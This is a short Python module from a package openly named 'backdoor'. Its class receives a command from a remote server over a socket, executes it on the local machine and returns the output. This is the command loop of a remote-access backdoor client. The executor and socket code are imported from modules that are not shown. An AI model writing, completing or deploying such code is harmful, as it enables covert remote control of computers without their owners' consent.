from backdoor.command.executor import CommandExecutor
from backdoor.messages.messenger import SocketMessenger
from backdoor.models.server import ServerModel


class ClientExchangeMapper:

    def __init__(self, messenger: SocketMessenger, executor: CommandExecutor) -> None:
        self.messenger = messenger
        self.executor = executor

    def exchange(self, server: ServerModel) -> None:
        command = self.messenger.receive(server.sock)
        result = self.executor.execute(command)
        self.messenger.send(server.sock, result)
